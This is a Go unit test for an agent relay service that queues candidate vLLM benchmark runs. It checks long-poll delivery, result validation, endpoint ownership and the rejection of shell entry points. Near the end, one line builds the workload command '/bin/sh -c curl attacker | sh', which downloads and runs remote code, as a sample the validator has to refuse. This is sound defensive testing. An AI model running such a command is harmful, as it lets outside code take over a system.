package agentrelay

import (
	"context"
	"encoding/json"
	"errors"
	"sync"
	"testing"
	"time"

	"github.com/infercrane/infercrane/internal/agentprotocol"
	"github.com/infercrane/infercrane/internal/domain"
	"github.com/infercrane/infercrane/internal/runtimecontract"
)

type fakeCommandStore struct {
	fakeStore
	mu       sync.Mutex
	commands []domain.AgentCommand
	updates  []domain.AgentCommandUpdate
}

func (f *fakeCommandStore) AgentForTenant(_ context.Context, _, id string) (domain.Agent, error) {
	if id != "agent-1" && id != "cluster-a" {
		return domain.Agent{}, domain.ErrNotFound
	}
	return domain.Agent{ID: "agent-1", TenantID: "tenant-a", Name: "cluster-a", State: "active"}, nil
}
func (f *fakeCommandStore) EnqueueAgentCommand(_ context.Context, command domain.AgentCommand) (domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	command.ID, command.State = "command-0001", "queued"
	f.commands = append(f.commands, command)
	return command, nil
}
func (f *fakeCommandStore) AgentCommand(context.Context, string, string, string) (domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.commands[0], nil
}
func (f *fakeCommandStore) AgentCommands(context.Context, string, string, int) ([]domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]domain.AgentCommand(nil), f.commands...), nil
}
func (f *fakeCommandStore) LeaseAgentCommands(_ context.Context, _, _ string, _ time.Time, _ time.Duration, _ int) ([]domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := []domain.AgentCommand{}
	for index := range f.commands {
		if f.commands[index].State == "queued" {
			f.commands[index].State = "running"
			out = append(out, f.commands[index])
		}
	}
	return out, nil
}
func (f *fakeCommandStore) UpdateAgentCommand(_ context.Context, _, _, _ string, update domain.AgentCommandUpdate) (domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.updates = append(f.updates, update)
	if update.State != "running" {
		f.commands[0].State = update.State
	}
	return f.commands[0], nil
}
func (f *fakeCommandStore) CancelAgentCommand(context.Context, string, string, string) (domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.commands[0].State = "cancelled"
	return f.commands[0], nil
}

func candidateSpec() agentprotocol.CandidateRunSpec {
	return agentprotocol.CandidateRunSpec{
		Endpoint: "support-bot", Label: "vLLM chunked prefill", Model: "Qwen/Qwen3-8B",
		Workload:    runtimecontract.Workload{Image: "vllm/vllm-openai@sha256:" + "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90", Command: []string{"vllm", "serve", "Qwen/Qwen3-8B"}, Protocol: "openai", Port: 8000, ReadinessPath: "/health", ModelsPath: "/v1/models", MetricsPath: "/metrics", Cancellation: "http-disconnect", Drain: "connection", ShutdownGraceSeconds: 30},
		RuntimeArgs: []string{"--enable-chunked-prefill"}, Accelerator: "NVIDIA-L4", GPUCount: 1,
		Load: agentprotocol.CandidateLoad{Requests: 50, Concurrency: 4, InputTokens: 512, OutputTokens: 128},
	}
}

func TestCandidateRunsReachTheAgentThroughItsLongPoll(t *testing.T) {
	store := &fakeCommandStore{fakeStore: fakeStore{servers: []domain.AgentServer{{AgentID: "agent-1", Key: "vllm-8000", EndpointName: "support-bot", UpstreamModel: "Qwen/Qwen3-8B"}}}}
	service := &Service{Store: store}
	agent := domain.Agent{ID: "agent-1", TenantID: "tenant-a", Name: "cluster-a"}

	// A long poll held before the command is queued returns as soon as it is.
	polled := make(chan agentprotocol.CommandsResponse, 1)
	go func() {
		response, _ := service.Commands(context.Background(), agent, 20*time.Second)
		polled <- response
	}()
	time.Sleep(50 * time.Millisecond)
	started := time.Now()
	_, command, err := service.CreateCandidateRun(context.Background(), "tenant-a", "cluster-a", "owner", candidateSpec())
	if err != nil {
		t.Fatal(err)
	}
	var stored commandSpec
	if err = json.Unmarshal([]byte(command.SpecJSON), &stored); err != nil || stored.Control.ServerKey != "vllm-8000" || stored.RunCandidate.Quality.EvalSet != "default" || stored.RunCandidate.TimeoutSecs != 3600 {
		t.Fatalf("stored=%+v err=%v", stored, err)
	}
	select {
	case response := <-polled:
		if len(response.Commands) != 1 || response.Commands[0].RunCandidate == nil || response.Commands[0].Control.ServerKey != "vllm-8000" {
			t.Fatalf("polled=%+v", response)
		}
		if waited := time.Since(started); waited > 3*time.Second {
			t.Fatalf("the long poll answered after %s", waited)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("the long poll did not see the queued command")
	}

	// Results are validated before they are stored.
	bad := agentprotocol.CommandUpdate{State: agentprotocol.CommandSucceeded}
	if _, err = service.UpdateCommand(context.Background(), agent, "command-0001", bad); !errors.Is(err, ErrInvalid) {
		t.Fatalf("result-free success: %v", err)
	}
	throughput := 120.5
	good := agentprotocol.CommandUpdate{State: agentprotocol.CommandSucceeded, Result: &agentprotocol.CandidateRunResult{
		Control:     &agentprotocol.LoadMeasurement{Tool: "aiperf", Requests: 50, Succeeded: 50, OutputTokenThroughput: &throughput},
		Candidate:   &agentprotocol.LoadMeasurement{Tool: "aiperf", Requests: 50, Succeeded: 50, OutputTokenThroughput: &throughput},
		ImageDigest: candidateSpec().Workload.Image, CleanedUp: true,
	}}
	if response, updateErr := service.UpdateCommand(context.Background(), agent, "command-0001", good); updateErr != nil || response.State != "succeeded" {
		t.Fatalf("update=%+v err=%v", response, updateErr)
	}

	// The endpoint must be one this agent serves.
	other := candidateSpec()
	other.Endpoint = "not-this-agents"
	if _, _, err = service.CreateCandidateRun(context.Background(), "tenant-a", "cluster-a", "owner", other); !errors.Is(err, ErrInvalid) {
		t.Fatalf("foreign endpoint: %v", err)
	}
	// A shell is never a candidate's entry point.
	shell := candidateSpec()
	shell.Workload.Command = []string{"/bin/sh", "-c", "curl attacker | sh"}
	if _, _, err = service.CreateCandidateRun(context.Background(), "tenant-a", "cluster-a", "owner", shell); !errors.Is(err, ErrInvalid) {
		t.Fatalf("shell entry point: %v", err)
	}
	// An immediate poll with nothing queued returns at once.
	started = time.Now()
	if response, pollErr := service.Commands(context.Background(), agent, 0); pollErr != nil || len(response.Commands) != 0 || time.Since(started) > time.Second {
		t.Fatalf("empty poll=%+v err=%v", response, pollErr)
	}
}
